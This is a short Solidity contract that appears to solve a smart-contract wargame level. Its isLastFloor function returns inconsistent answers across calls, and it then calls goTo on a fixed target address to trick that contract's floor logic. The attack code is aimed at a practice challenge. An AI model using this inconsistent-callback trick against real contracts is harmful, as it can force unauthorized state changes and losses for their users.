// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface test {
    function goTo(uint256) external;
}

contract Building {
    test target = test(0x9b6f6f849B91A50f86503434FdBE6C6b5a19Fd81);

    uint256 callNum = 0;

    function isLastFloor(uint256 number) public returns (bool) {
        if (callNum == 0) {
            callNum = 1;
            return false;
        } else {
            callNum = 0;
            return true;
        }
    }

    function solve() public {
        target.goTo(10);
    }
}